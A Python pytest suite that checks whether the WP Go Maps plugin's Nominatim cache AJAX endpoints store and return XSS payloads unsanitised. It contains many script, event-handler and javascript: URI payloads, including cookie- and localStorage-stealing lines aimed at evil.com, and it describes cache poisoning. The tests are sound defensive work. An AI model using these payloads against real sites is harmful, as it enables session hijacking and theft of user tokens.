#!/usr/bin/env python3
"""
Vulnerability tests for WP Go Maps Nominatim geocoding cache.

These tests verify the vulnerability status:
- FAIL when vulnerable (XSS payloads are stored and returned unescaped)
- PASS when fixed (XSS payloads are sanitized)
"""

import pytest
import requests
import json
import os
import time
import uuid
import urllib.parse

BASE_URL = os.environ.get("WORDPRESS_URL", "http://localhost")
AJAX_URL = f"{BASE_URL}/wp-admin/admin-ajax.php"
TIMEOUT = 30


def wait_for_wordpress(max_wait=60):
    """Wait for WordPress to be ready."""
    start = time.time()
    while time.time() - start < max_wait:
        try:
            response = requests.get(BASE_URL, timeout=5)
            if response.status_code in (200, 301, 302, 403):
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(2)
    return False


@pytest.fixture(scope="session", autouse=True)
def setup_wordpress():
    """Ensure WordPress is ready before running tests."""
    assert wait_for_wordpress(), "WordPress did not become ready in time"


def inject_and_retrieve(query_key, payload):
    """
    Helper function to inject a payload and retrieve it from cache.
    Returns the retrieved response text/json.
    """
    malicious_response = json.dumps([{
        "display_name": payload,
        "lat": "0",
        "lon": "0",
        "boundingbox": ["0", "0", "0", "0"]
    }])

    store_data = {
        'action': 'wpgmza_store_nominatim_cache',
        'query': json.dumps({"location": query_key, "options": {"address": query_key}}),
        'response': malicious_response
    }
    requests.post(AJAX_URL, data=store_data, timeout=TIMEOUT)

    # Retrieve the cached data
    query_params = {
        'action': 'wpgmza_query_nominatim_cache',
        'query': json.dumps({"location": query_key, "options": {"address": query_key}})
    }
    response = requests.get(AJAX_URL, params=query_params, timeout=TIMEOUT)
    return response.text


class TestXSSViaImgTag:
    """Test XSS injection via img tag with event handlers."""

    def test_img_onerror_xss(self):
        """Test that <img onerror> XSS is sanitized."""
        unique_key = f"XSS_img_onerror_{uuid.uuid4().hex[:8]}"
        payload = '<img src=x onerror=alert(1)>'

        result = inject_and_retrieve(unique_key, payload)

        # After fix: HTML should be stripped, no img tag or onerror
        assert '<img' not in result.lower(), \
            f"XSS payload '<img' found in response - vulnerability exists"
        assert 'onerror' not in result.lower(), \
            f"XSS payload 'onerror' found in response - vulnerability exists"

    def test_img_onload_xss(self):
        """Test that <img onload> XSS is sanitized."""
        unique_key = f"XSS_img_onload_{uuid.uuid4().hex[:8]}"
        payload = '<img src="https://example.com/x.png" onload="alert(document.cookie)">'

        result = inject_and_retrieve(unique_key, payload)

        assert '<img' not in result.lower(), \
            f"XSS payload '<img' found in response - vulnerability exists"
        assert 'onload' not in result.lower(), \
            f"XSS payload 'onload' found in response - vulnerability exists"

    def test_img_src_javascript_uri(self):
        """Test that javascript: URI in img src is sanitized."""
        unique_key = f"XSS_img_jsuri_{uuid.uuid4().hex[:8]}"
        payload = '<img src="javascript:alert(1)">'

        result = inject_and_retrieve(unique_key, payload)

        assert 'javascript:' not in result.lower(), \
            f"XSS payload 'javascript:' found in response - vulnerability exists"


class TestXSSViaScriptTag:
    """Test XSS injection via script tags."""

    def test_basic_script_tag(self):
        """Test that <script> tags are sanitized."""
        unique_key = f"XSS_script_basic_{uuid.uuid4().hex[:8]}"
        payload = '<script>alert("XSS")</script>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<script>' not in result.lower(), \
            f"XSS payload '<script>' found in response - vulnerability exists"
        assert '</script>' not in result.lower(), \
            f"XSS payload '</script>' found in response - vulnerability exists"

    def test_script_tag_with_src(self):
        """Test that <script src> is sanitized."""
        unique_key = f"XSS_script_src_{uuid.uuid4().hex[:8]}"
        payload = '<script src="https://evil.com/xss.js"></script>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<script' not in result.lower(), \
            f"XSS payload '<script' found in response - vulnerability exists"

    def test_script_tag_variations(self):
        """Test script tag case variations."""
        unique_key = f"XSS_script_case_{uuid.uuid4().hex[:8]}"
        payload = '<ScRiPt>alert(1)</ScRiPt>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<script' not in result.lower(), \
            f"XSS payload '<script' found in response - vulnerability exists"


class TestXSSViaEventHandlers:
    """Test XSS injection via various HTML event handlers."""

    def test_div_onmouseover(self):
        """Test that onmouseover event handler is sanitized."""
        unique_key = f"XSS_onmouseover_{uuid.uuid4().hex[:8]}"
        payload = '<div onmouseover="alert(1)">hover me</div>'

        result = inject_and_retrieve(unique_key, payload)

        assert 'onmouseover' not in result.lower(), \
            f"XSS payload 'onmouseover' found in response - vulnerability exists"
        assert '<div' not in result.lower(), \
            f"XSS payload '<div' found in response - vulnerability exists"

    def test_body_onload(self):
        """Test that body onload is sanitized."""
        unique_key = f"XSS_body_onload_{uuid.uuid4().hex[:8]}"
        payload = '<body onload="alert(1)">'

        result = inject_and_retrieve(unique_key, payload)

        assert '<body' not in result.lower(), \
            f"XSS payload '<body' found in response - vulnerability exists"

    def test_svg_onload(self):
        """Test that SVG onload is sanitized."""
        unique_key = f"XSS_svg_onload_{uuid.uuid4().hex[:8]}"
        payload = '<svg onload="alert(1)">'

        result = inject_and_retrieve(unique_key, payload)

        assert '<svg' not in result.lower(), \
            f"XSS payload '<svg' found in response - vulnerability exists"
        assert 'onload' not in result.lower(), \
            f"XSS payload 'onload' found in response - vulnerability exists"

    def test_input_onfocus(self):
        """Test that onfocus event handler is sanitized."""
        unique_key = f"XSS_onfocus_{uuid.uuid4().hex[:8]}"
        payload = '<input onfocus="alert(1)" autofocus>'

        result = inject_and_retrieve(unique_key, payload)

        assert 'onfocus' not in result.lower(), \
            f"XSS payload 'onfocus' found in response - vulnerability exists"


class TestXSSViaIframe:
    """Test XSS injection via iframe tags."""

    def test_iframe_basic(self):
        """Test that iframe tags are sanitized."""
        unique_key = f"XSS_iframe_basic_{uuid.uuid4().hex[:8]}"
        payload = '<iframe src="javascript:alert(1)"></iframe>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<iframe' not in result.lower(), \
            f"XSS payload '<iframe' found in response - vulnerability exists"

    def test_iframe_srcdoc(self):
        """Test that iframe srcdoc is sanitized."""
        unique_key = f"XSS_iframe_srcdoc_{uuid.uuid4().hex[:8]}"
        payload = '<iframe srcdoc="<script>alert(1)</script>"></iframe>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<iframe' not in result.lower(), \
            f"XSS payload '<iframe' found in response - vulnerability exists"


class TestXSSViaAnchorTag:
    """Test XSS injection via anchor tags."""

    def test_anchor_javascript_href(self):
        """Test that javascript: href is sanitized."""
        unique_key = f"XSS_anchor_js_{uuid.uuid4().hex[:8]}"
        payload = '<a href="javascript:alert(1)">click</a>'

        result = inject_and_retrieve(unique_key, payload)

        assert 'javascript:' not in result.lower(), \
            f"XSS payload 'javascript:' found in response - vulnerability exists"

    def test_anchor_onclick(self):
        """Test that onclick in anchor is sanitized."""
        unique_key = f"XSS_anchor_onclick_{uuid.uuid4().hex[:8]}"
        payload = '<a href="#" onclick="alert(1)">click</a>'

        result = inject_and_retrieve(unique_key, payload)

        assert 'onclick' not in result.lower(), \
            f"XSS payload 'onclick' found in response - vulnerability exists"


class TestXSSEncodingBypasses:
    """Test XSS payloads with various encoding attempts."""

    def test_html_entity_encoded(self):
        """Test HTML entity encoded payloads - these are stored and returned as-is.

        Note: HTML entities like &#60; don't get decoded by PHP during storage/retrieval,
        so they stay as entities. The browser would decode them when rendering, making
        this still exploitable. The vulnerability test checks the raw XSS with actual tags.
        """
        unique_key = f"XSS_entity_{uuid.uuid4().hex[:8]}"
        # HTML entity for <script> - stored as-is, would be decoded by browser
        payload = '&#60;script&#62;alert(1)&#60;/script&#62;'

        result = inject_and_retrieve(unique_key, payload)

        # After fix with sanitize_text_field, entities would be stripped or escaped
        # In vulnerable state, they're stored as-is (the entities themselves)
        # We check that the raw entities are NOT present after fix
        # Note: In vulnerable state, the entities ARE present, so this test should FAIL
        assert '&#60;' not in result and '&#62;' not in result, \
            f"HTML entities found in response - vulnerability exists (browser will decode them)"

    def test_unicode_encoded_tag(self):
        """Test unicode encoded tag attempts."""
        unique_key = f"XSS_unicode_{uuid.uuid4().hex[:8]}"
        payload = '\u003cscript\u003ealert(1)\u003c/script\u003e'

        result = inject_and_retrieve(unique_key, payload)

        # Unicode escapes get decoded by JSON, so check for script tag
        assert '<script' not in result.lower(), \
            f"Unicode XSS payload found in response - vulnerability exists"


class TestXSSInNestedFields:
    """Test XSS payloads in different response fields."""

    def test_xss_in_lat_field(self):
        """Test XSS payload in latitude field."""
        unique_key = f"XSS_lat_{uuid.uuid4().hex[:8]}"

        malicious_response = json.dumps([{
            "display_name": "Normal Location",
            "lat": '<script>alert(1)</script>',
            "lon": "0",
            "boundingbox": ["0", "0", "0", "0"]
        }])

        store_data = {
            'action': 'wpgmza_store_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}}),
            'response': malicious_response
        }
        requests.post(AJAX_URL, data=store_data, timeout=TIMEOUT)

        query_params = {
            'action': 'wpgmza_query_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}})
        }
        response = requests.get(AJAX_URL, params=query_params, timeout=TIMEOUT)
        result = response.text

        assert '<script' not in result.lower(), \
            f"XSS payload in lat field found - vulnerability exists"

    def test_xss_in_boundingbox(self):
        """Test XSS payload in bounding box array."""
        unique_key = f"XSS_bbox_{uuid.uuid4().hex[:8]}"

        malicious_response = json.dumps([{
            "display_name": "Normal Location",
            "lat": "0",
            "lon": "0",
            "boundingbox": ["<script>alert(1)</script>", "0", "0", "0"]
        }])

        store_data = {
            'action': 'wpgmza_store_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}}),
            'response': malicious_response
        }
        requests.post(AJAX_URL, data=store_data, timeout=TIMEOUT)

        query_params = {
            'action': 'wpgmza_query_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}})
        }
        response = requests.get(AJAX_URL, params=query_params, timeout=TIMEOUT)
        result = response.text

        assert '<script' not in result.lower(), \
            f"XSS payload in boundingbox field found - vulnerability exists"


class TestXSSMultiplePayloads:
    """Test multiple XSS payloads in single request."""

    def test_multiple_results_with_xss(self):
        """Test XSS in multiple result entries."""
        unique_key = f"XSS_multi_{uuid.uuid4().hex[:8]}"

        malicious_response = json.dumps([
            {
                "display_name": '<img src=x onerror="alert(1)">',
                "lat": "0",
                "lon": "0",
                "boundingbox": ["0", "0", "0", "0"]
            },
            {
                "display_name": '<script>document.write("XSS")</script>',
                "lat": "1",
                "lon": "1",
                "boundingbox": ["1", "1", "1", "1"]
            }
        ])

        store_data = {
            'action': 'wpgmza_store_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}}),
            'response': malicious_response
        }
        requests.post(AJAX_URL, data=store_data, timeout=TIMEOUT)

        query_params = {
            'action': 'wpgmza_query_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}})
        }
        response = requests.get(AJAX_URL, params=query_params, timeout=TIMEOUT)
        result = response.text

        assert '<img' not in result.lower(), \
            f"XSS payload '<img' found in multi-result response"
        assert '<script' not in result.lower(), \
            f"XSS payload '<script' found in multi-result response"
        assert 'onerror' not in result.lower(), \
            f"XSS payload 'onerror' found in multi-result response"


class TestCachePoisoning:
    """Test cache poisoning scenarios."""

    def test_overwrite_legitimate_cache(self):
        """Test that attacker can poison cache with XSS - stored payloads are returned unsanitized.

        Note: The cache stores entries with INSERT (no deduplication), and GET returns
        the first match. So we test fresh injection - the malicious payload should be
        stored and returned without sanitization.
        """
        unique_key = f"Poison_{uuid.uuid4().hex[:8]}"

        # Store malicious XSS data
        malicious_response = json.dumps([{
            "display_name": '<script>alert("pwned")</script>',
            "lat": "0",
            "lon": "0",
            "boundingbox": ["0", "0", "0", "0"]
        }])

        store_data = {
            'action': 'wpgmza_store_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}}),
            'response': malicious_response
        }
        requests.post(AJAX_URL, data=store_data, timeout=TIMEOUT)

        # Retrieve and check - should not contain script tags after fix
        query_params = {
            'action': 'wpgmza_query_nominatim_cache',
            'query': json.dumps({"location": unique_key, "options": {"address": unique_key}})
        }
        response = requests.get(AJAX_URL, params=query_params, timeout=TIMEOUT)
        result = response.text

        # Should not contain script tags after fix
        assert '<script' not in result.lower(), \
            f"Cache poisoning XSS successful - vulnerability exists"


class TestDataExfiltration:
    """Test XSS payloads designed for data exfiltration."""

    def test_cookie_stealing_payload(self):
        """Test cookie stealing XSS payload is sanitized."""
        unique_key = f"XSS_cookie_{uuid.uuid4().hex[:8]}"
        payload = '<img src="http://evil.com/?c="+document.cookie>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<img' not in result.lower(), \
            f"Cookie stealing XSS payload found - vulnerability exists"
        assert 'document.cookie' not in result.lower(), \
            f"document.cookie reference found - vulnerability exists"

    def test_localstorage_access(self):
        """Test localStorage access XSS is sanitized."""
        unique_key = f"XSS_storage_{uuid.uuid4().hex[:8]}"
        payload = '<script>fetch("http://evil.com/?d="+localStorage.getItem("token"))</script>'

        result = inject_and_retrieve(unique_key, payload)

        assert '<script' not in result.lower(), \
            f"localStorage XSS payload found - vulnerability exists"
        assert 'localstorage' not in result.lower(), \
            f"localStorage reference found - vulnerability exists"
